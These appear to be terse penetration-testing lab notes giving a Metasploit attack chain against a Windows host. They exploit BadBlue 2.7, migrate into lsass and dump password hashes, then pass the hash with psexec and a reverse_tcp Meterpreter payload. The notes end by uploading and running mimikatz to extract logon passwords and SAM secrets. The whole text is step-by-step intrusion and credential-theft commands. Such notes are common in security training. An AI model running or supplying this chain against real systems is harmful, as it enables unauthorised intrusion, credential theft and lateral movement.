```
use exploit/windows/http/badblue_passthru
set target <tab>
set target BadBlue\ EE\ 2.7\ Universal
exploit
```

- `sysinfo` 
> if you meterpreter session is x86 use the below commands
- `pgrep lsass`
- `migrate 792`
- `hashdump` --> copy all the hash with user and save it in a file exit form the meterpreter session
__you will get like this__
```
Administrator:500:aadaflj2498kl3j42h5g243lk2k2lldasjfkhk32828:::
DefaultAccount:503:aadaflj2498kl3j42h5g243lk2k2lldasjfkhk32828:::
Guest:501:aadaflj2498kl3j42h5g243lk2k2lldasjfkhk32828:::
```
- `exit`
- __`search psexec`__
```
use exploit/windows/smb/psexec
set payload windows/x64/meterpreter/reverse_tcp
set SMBUser Administrator
set SMBPass aadaflj2498kl3j42h5g243lk2k2lldasjfkhk32828
exploit

```


- __`load kiwi`__
kiwi commands
  - __`1.creds_all`__
  - __`2.lsa_dump_sam`__
  - __`3.lsa_dump_secrets`__
 

in meterpreter 
- `upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe`
- `shell`
- `.\mimikatz.exe`
- `privilege::debug`
- output: `Privilege '20' OK`
- `sekurlsa::logonpasswords`
- `lsadump::sam`
